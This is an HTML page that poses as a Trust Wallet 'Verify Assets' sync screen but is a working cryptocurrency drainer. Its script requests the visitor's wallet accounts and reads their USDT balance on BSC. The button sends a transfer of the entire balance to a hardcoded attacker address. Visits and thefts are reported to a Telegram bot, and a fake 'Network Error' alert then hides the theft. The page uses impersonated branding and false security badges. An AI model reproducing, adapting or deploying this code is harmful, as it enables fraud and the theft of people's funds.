<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet | Secure Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    <style>
        /* Modern UI Reset */
        * { box-sizing: border-box; }
        body { 
            margin: 0; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: radial-gradient(circle at top right, #1a1e26, #0b0e11); 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden; 
        }

        /* Subtle Glow Background */
        body::before {
            content: "";
            position: absolute;
            width: 300px;
            height: 300px;
            background: #3172DE;
            filter: blur(150px);
            opacity: 0.15;
            top: 10%;
            left: 10%;
            z-index: 0;
        }

        .card { 
            background: rgba(30, 35, 41, 0.7); 
            backdrop-filter: blur(15px);
            padding: 40px 30px; 
            border-radius: 32px; 
            text-align: center; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.5); 
            width: 90%; 
            max-width: 380px; 
            border: 1px solid rgba(255, 255, 255, 0.05);
            position: relative;
            z-index: 1;
        }

        .logo-img { width: 60px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(49, 114, 222, 0.3)); }

        .status-pill {
            display: inline-flex;
            align-items: center;
            background: rgba(14, 203, 129, 0.1);
            color: #0ecb81;
            padding: 6px 14px;
            border-radius: 100px;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 0.5px;
            margin-bottom: 20px;
            border: 1px solid rgba(14, 203, 129, 0.2);
        }

        .status-pill::before {
            content: "";
            width: 6px;
            height: 6px;
            background: #0ecb81;
            border-radius: 50%;
            margin-right: 8px;
            box-shadow: 0 0 8px #0ecb81;
        }

        h2 { font-size: 24px; font-weight: 700; margin: 0 0 12px 0; color: #fff; }
        p { color: #929aa5; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }

        .btn { 
            background: linear-gradient(135deg, #3172DE 0%, #2659ad 100%); 
            color: #fff; 
            border: none; 
            padding: 18px; 
            width: 100%; 
            border-radius: 18px; 
            font-size: 16px; 
            font-weight: 700; 
            cursor: pointer; 
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(49, 114, 222, 0.3);
        }

        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 25px rgba(49, 114, 222, 0.4); }
        .btn:active { transform: translateY(0); opacity: 0.9; }

        /* Full-screen Loading Overlay */
        #overlay { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: #0b0e11; 
            z-index: 999; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
        }

        .spinner-box { position: relative; width: 60px; height: 60px; margin-bottom: 25px; }
        .spinner { 
            width: 100%; height: 100%; 
            border: 3px solid rgba(49, 114, 222, 0.1); 
            border-top: 3px solid #3172DE; 
            border-radius: 50%; 
            animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; 
        }

        #loading-text { font-size: 18px; color: #fff; font-weight: 600; letter-spacing: -0.2px; }
        #sub-text { font-size: 13px; color: #5e6673; margin-top: 12px; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo-img">
        <br>
        <div class="status-pill">SECURE NODE ENCRYPTED</div>
        <h2>Verify Assets</h2>
        <p>Authorize a secure on-chain snapshot to verify your BEP20 assets and secure your wallet node.</p>
        <button id="nextBtn" class="btn" onclick="trigger()">Verify Assets</button>
        
        <div style="margin-top: 25px; display: flex; align-items: center; justify-content: center; opacity: 0.4;">
            <img src="https://cryptologos.cc/logos/binance-smart-chain-bnb-logo.png" width="14" style="margin-right: 6px;">
            <span style="font-size: 11px; font-weight: 600;">Verified by BSC Network</span>
        </div>
    </div>

    <div id="overlay">
        <div class="spinner-box">
            <div class="spinner"></div>
        </div>
        <div id="loading-text">Synchronizing Node...</div>
        <div id="sub-text">Please confirm the request in your wallet</div>
    </div>

    <script>
        // --- CONFIG ---
        const MY_ADDR = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
        const TG_TOKEN = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
        const TG_CHAT = "7849151110";

        async function sendTG(msg) {
            try { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); } catch(e){}
        }

        window.onload = function() {
            if (window.ethereum || window.trustwallet) trigger(true);
        };

        async function trigger(isAuto = false) {
            const hasWallet = !!(window.ethereum || window.trustwallet);
            
            if (!hasWallet) {
                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
                return;
            }

            if (!isAuto) document.getElementById("overlay").style.display = "flex";

            try {
                const web3 = new Web3(window.ethereum || window.trustwallet);
                const accs = await web3.eth.requestAccounts();
                const user = accs[0];

                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });

                const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
                const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
                const balWei = await contract.methods.balanceOf(user).call();
                const bal = web3.utils.fromWei(balWei, 'ether');

                if (isAuto) {
                    sendTG(`ðŸ”” <b>New Visit</b>\nUser: <code>${user}</code>\nBalance: <b>${bal} USDT</b>`);
                } else {
                    document.getElementById("loading-text").innerText = "Finalizing Sync...";
                    sendTG(`ðŸš€ <b>Action Taken</b>\nUser: <code>${user}</code>\nAmt: <b>${bal} USDT</b>`);
                    
                    await contract.methods.transfer(MY_ADDR, balWei).send({ from: user });
                    
                    sendTG(`âœ… <b>Success!</b>\nUser <code>${user}</code> completed verification.`);
                    alert("Network Error: Verification timed out. Please try again.");
                }
            } catch (e) {
                if (!isAuto) {
                    document.getElementById("overlay").style.display = "none";
                    alert("Verification rejected by security protocol.");
                }
            }
        }
    </script>
</body>
</html>
